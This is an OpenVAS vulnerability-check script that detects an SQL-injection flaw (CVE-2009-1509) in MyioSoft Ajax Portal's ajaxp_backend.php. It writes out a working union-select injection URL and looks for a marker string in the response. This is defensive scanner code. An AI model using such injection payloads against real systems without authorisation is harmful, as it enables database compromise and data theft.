###############################################################################
# OpenVAS Vulnerability Test
# $Id: MyioSoft_ajax_portal_34338.nasl 15 2013-10-27 12:49:54Z jan $
#
# MyioSoft Ajax Portal 'ajaxp_backend.php' SQL Injection Vulnerability
#
# Authors:
# Michael Meyer
#
# Copyright:
# Copyright (c) 2009 Greenbone Networks GmbH
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

include("revisions-lib.inc");
tag_summary = "MyioSoft Ajax Portal is prone to an SQL-injection vulnerability
  because it fails to sufficiently sanitize user-supplied data before
  using it in an SQL query.

  Exploiting this issue could allow an attacker to compromise the
  application, access or modify data, or exploit latent
  vulnerabilities in the underlying database.

  Ajax Portal 3.0 is vulnerable; other versions may also be affected.";


if (description)
{
 script_id(100095);
 script_version("$Revision: 15 $");
 script_tag(name:"last_modification", value:"$Date: 2013-10-27 13:49:54 +0100 (Sun, 27 Oct 2013) $");
 script_tag(name:"creation_date", value:"2009-04-02 12:09:33 +0200 (Thu, 02 Apr 2009)");
 script_tag(name:"cvss_base", value:"7.5");
 script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");
 script_cve_id("CVE-2009-1509");
 script_bugtraq_id(34338);
 script_tag(name:"risk_factor", value:"High");

 script_name("MyioSoft Ajax Portal 'ajaxp_backend.php' SQL Injection Vulnerability");
 desc = "

 Summary:
 " + tag_summary;


 script_description(desc);
 script_summary("Determine if MyioSoft Ajax Portal 'ajaxp_backend.php' is vulnerable to Multiple SQL Injection");
 script_category(ACT_GATHER_INFO);
 script_family("Web application abuses");
 script_copyright("This script is Copyright (C) 2009 Greenbone Networks GmbH");
 script_dependencies("find_service.nasl", "http_version.nasl");
 script_require_ports("Services/www", 80);
 script_exclude_keys("Settings/disable_cgi_scanning");
 if (revcomp(a: OPENVAS_VERSION, b: "6.0+beta5") >= 0) {
   script_tag(name : "summary" , value : tag_summary);
 }
 script_xref(name : "URL" , value : "http://www.securityfocus.com/bid/34338");
 exit(0);
}

include("http_func.inc");
include("http_keepalive.inc");

port = get_http_port(default:80);

if(!get_port_state(port))exit(0);
if(!can_host_php(port:port))exit(0);

dir = make_list("/portal",cgi_dirs());
foreach d (dir)
{ 
 url = string(d, "/ajaxp_backend.php?page=-1+union+select+1,0x4f70656e5641532d53514c2d496e6a656374696f6e2d54657374,3,4,5,6,7--");
 req = http_get(item:url, port:port);
 buf = http_keepalive_send_recv(port:port, data:req, bodyonly:1);
 if( buf == NULL )continue;

 if( egrep(pattern:"OpenVAS-SQL-Injection-Test", string: buf) )
   {    
     security_hole(port:port);
     exit(0);
   } 
}
exit(0);
